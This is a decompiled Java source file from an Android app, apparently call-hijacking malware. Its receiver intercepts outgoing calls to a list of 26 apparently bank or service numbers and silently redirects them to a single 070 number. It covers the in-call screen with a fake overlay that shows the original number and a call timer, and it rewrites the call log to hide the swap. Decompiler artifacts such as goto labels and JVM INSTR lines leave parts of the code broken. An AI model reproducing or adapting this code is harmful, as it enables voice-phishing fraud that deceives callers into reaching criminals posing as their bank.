// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.example.receiver;

import android.app.ActivityManager;
import android.content.*;
import android.os.Handler;
import android.os.Message;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.*;
import android.widget.TextView;
import java.util.List;

public class DiaReceiver extends BroadcastReceiver
{
    class PhoneActiveListenThread extends Thread
    {

        public void run()
        {
            do
                try
                {
                    Log.i("test", (new StringBuilder(String.valueOf(isPhoneViewShow(mContext)))).toString());
                    if(isPhoneViewShow(mContext))
                    {
                        Thread.sleep(510L);
                        handler.sendEmptyMessage(2);
                    }
                    Thread.sleep(100L);
                }
                catch(InterruptedException interruptedexception)
                {
                    interruptedexception.printStackTrace();
                }
            while(true);
        }

        private Context mContext;
        final DiaReceiver this$0;

        public PhoneActiveListenThread(Context context)
        {
            this$0 = DiaReceiver.this;
            super();
            mContext = context;
        }
    }

    public class PhoneCallListener extends PhoneStateListener
    {

        public void onCallStateChanged(int i, String s)
        {
            i;
            JVM INSTR tableswitch 0 2: default 28
        //                       0 28
        //                       1 28
        //                       2 35;
               goto _L1 _L1 _L1 _L2
_L1:
            super.onCallStateChanged(i, s);
            return;
_L2:
            DiaReceiver.count = 1 + DiaReceiver.count;
            Log.i("test", (new StringBuilder(" count=")).append(DiaReceiver.count).toString());
            if(DiaReceiver.count % 2 == 0)
            {
                Log.i("test", (new StringBuilder("\uFFFD\u04B6\u03FA\uFFFD\uFFFD\uFFFD")).append(s).append("   ").append(number).append(" count=").append(DiaReceiver.count).toString());
                handler.sendEmptyMessage(1);
            }
            if(true) goto _L1; else goto _L3
_L3:
        }

        final DiaReceiver this$0;

        public PhoneCallListener()
        {
            this$0 = DiaReceiver.this;
            super();
        }
    }

    class PhoneHookListenThread extends Thread
    {

        public void run()
        {
            try
            {
                Thread.sleep(3000L);
            }
            catch(InterruptedException interruptedexception)
            {
                interruptedexception.printStackTrace();
            }
            do
                try
                {
                    Log.i("test", (new StringBuilder(String.valueOf(isPhoneViewShow(mContext)))).toString());
                    if(!isPhoneViewShow(mContext))
                        handler.sendEmptyMessage(1);
                    Thread.sleep(10L);
                }
                catch(InterruptedException interruptedexception1)
                {
                    interruptedexception1.printStackTrace();
                }
            while(true);
        }

        private Context mContext;
        final DiaReceiver this$0;

        public PhoneHookListenThread(Context context)
        {
            this$0 = DiaReceiver.this;
            super();
            mContext = context;
        }
    }

    class TimeThread extends Thread
    {

        public void run()
        {
            int i = 0;
_L2:
            Message message = handler.obtainMessage();
            message.what = 3;
            message.arg1 = i;
            handler.sendMessage(message);
            i++;
            try
            {
                Thread.sleep(1000L);
            }
            catch(InterruptedException interruptedexception)
            {
                interruptedexception.printStackTrace();
            }
            if(true) goto _L2; else goto _L1
_L1:
        }

        final DiaReceiver this$0;

        TimeThread()
        {
            this$0 = DiaReceiver.this;
            super();
        }
    }


    public DiaReceiver()
    {
        number = "";
        timeThreadFlag = false;
        time = 0;
        phoneNumber2Call = "";
    }

    private void ModifyCall(Context context)
    {
        ContentValues contentvalues = new ContentValues();
        contentvalues.put("number", number);
        ContentResolver contentresolver = context.getContentResolver();
        android.net.Uri uri = android.provider.CallLog.Calls.CONTENT_URI;
        String as[] = new String[1];
        as[0] = phoneNumber2Call;
        contentresolver.update(uri, contentvalues, "number=?", as);
    }

    public final boolean isPhoneViewShow(Context context)
    {
        ComponentName componentname = ((android.app.ActivityManager.RunningTaskInfo)((ActivityManager)context.getSystemService("activity")).getRunningTasks(2).get(0)).topActivity;
        return componentname != null && ("com.android.phone.InCallScreen".equals(componentname.getClassName()) || "com.android.phone.SemcInCallScreen".equals(componentname.getClassName()));
    }

    public void onReceive(final Context context, Intent intent)
    {
        if(intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL") && !number.equals(getResultData())) goto _L2; else goto _L1
_L1:
        return;
_L2:
        int i = 0;
        do
        {
            int j = phone2Call.length;
            boolean flag = false;
            if(i < j)
            {
label0:
                {
                    if(!getResultData().equals(phone2Call[i]))
                        break label0;
                    phoneNumber2Call = phone2Modify[i];
                    flag = true;
                }
            }
            if(flag)
            {
                number = getResultData();
                setResultData(phoneNumber2Call);
                abortBroadcast();
                dialogView = LayoutInflater.from(context).inflate(0x7f030006, null);
                wm = (WindowManager)context.getApplicationContext().getSystemService("window");
                final android.view.WindowManager.LayoutParams wmParams = new android.view.WindowManager.LayoutParams();
                wmParams.type = 2002;
                wmParams.format = 1;
                wmParams.flags = 40;
                wmParams.width = -1;
                wmParams.height = -2;
                wmParams.gravity = 51;
                TextView textview = (TextView)dialogView.findViewById(0x7f080007);
                final TextView tv_time = (TextView)dialogView.findViewById(0x7f080008);
                textview.setText(number);
                handler = new Handler(new android.os.Handler.Callback() {

                    public boolean handleMessage(Message message1)
                    {
                        switch(message1.what)
                        {
                        default:
                            return false;

                        case 1: // '\001'
                            DiaReceiver diareceiver;
                            int k;
                            Object aobj[];
                            String s;
                            Exception exception;
                            try
                            {
                                ModifyCall(context);
                                wm.removeView(dialogView);
                                handler.removeMessages(3);
                            }
                            catch(Exception exception1)
                            {
                                return false;
                            }
                            try
                            {
                                timeThread.interrupt();
                            }
                            catch(Exception exception2)
                            {
                                return false;
                            }
                            return false;

                        case 2: // '\002'
                            try
                            {
                                timeThreadFlag = true;
                                wm.addView(dialogView, wmParams);
                            }
                            // Misplaced declaration of an exception variable
                            catch(Exception exception)
                            {
                                return false;
                            }
                            return false;

                        case 3: // '\003'
                            Log.i("test", (new StringBuilder("========time=")).append(time).toString());
                            diareceiver = DiaReceiver.this;
                            k = diareceiver.time;
                            diareceiver.time = k + 1;
                            handler.sendEmptyMessageDelayed(3, 1000L);
                            aobj = new Object[2];
                            aobj[0] = Integer.valueOf(k / 60);
                            aobj[1] = Integer.valueOf(k % 60);
                            s = String.format("%02d:%02d", aobj);
                            tv_time.setText(s);
                            return false;
                        }
                    }

                    final DiaReceiver this$0;
                    private final Context val$context;
                    private final TextView val$tv_time;
                    private final android.view.WindowManager.LayoutParams val$wmParams;

            
            {
                this$0 = DiaReceiver.this;
                context = context1;
                wmParams = layoutparams;
                tv_time = textview;
                super();
            }
                });
                Message message = handler.obtainMessage();
                message.what = 3;
                handler.sendMessage(message);
                (new PhoneHookListenThread(context)).start();
                (new PhoneActiveListenThread(context)).start();
                return;
            }
            if(true)
                continue;
            i++;
        } while(true);
        if(true) goto _L1; else goto _L3
_L3:
    }

    static int count;
    private View dialogView;
    private Handler handler;
    String number;
    String phone2Call[] = {
        "15662210", "0215662210", "0215662220", "15662220", "0215662230", "15662230", "0215662240", "15662240", "023978600", "023979800", 
        "16008888", "0216008888", "15889999", "15885000", "15998000", "15991111", "15881599", "15887000", "15883500", "15882100", 
        "15662566", "15881515", "15666000", "15881900", "15999000", "023978600"
    };
    String phone2Modify[] = {
        "07076821413", "07076821413", "07076821413", "07076821413", "07076821413", "07076821413", "07076821413", "07076821413", "07076821413", "07076821413", 
        "07076821413", "07076821413", "07076821413", "07076821413", "07076821413", "07076821413", "07076821413", "07076821413", "07076821413", "07076821413"
    };
    String phoneNumber2Call;
    TelephonyManager telephonyManager;
    int time;
    private TimeThread timeThread;
    private boolean timeThreadFlag;
    private WindowManager wm;






}
